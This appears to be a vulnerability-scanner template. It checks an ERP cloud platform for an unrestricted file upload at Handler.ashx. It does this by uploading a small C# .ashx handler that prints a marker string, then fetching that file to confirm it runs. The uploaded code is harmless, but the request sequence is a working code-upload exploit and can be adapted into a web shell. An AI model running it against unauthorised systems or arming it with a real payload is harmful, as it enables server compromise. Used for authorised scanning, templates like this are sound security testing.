id: poc-yaml-jintongfang-erp-icmanager-upload

info:
  name: Vulnerability in 月子会所ERP管理云平台 Handler.ashx File Upload
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  t1: "{{rand_int(100, 1000)}}"

flow: |
  http(1) && http(2)

http:
  - id: upload-test
    method: POST
    path:
      - "{{BaseURL}}/Page/ICManager/ashx/Handler.ashx"
    headers:
      Content-Type: multipart/form-data; boundary=00content0boundary00
    body: |
      --00content0boundary00
      Content-Disposition: form-data; name="file"; filename="1.ashx"

      <% @ webhandler language="C#" class="AverageHandler" %>
      using System;
      using System.Web;

      public class AverageHandler : IHttpHandler
      {
      public bool IsReusable {
      get {
      return true;
      }
      }
      public void ProcessRequest(HttpContext ctx)
      {
      ctx.Response.Write("vulnerability{{t1}}");
      }
      }
      --00content0boundary00--
    matchers:
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: filename
        group: 1
        regex:
          - "(.+?).ashx"
        part: body
        internal: true

  - id: validate-upload
    method: GET
    path:
      - "{{BaseURL}}/UploadBaseFolder/Contact/{{filename}}.ashx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "vulnerability{{t1}}"
        part: body
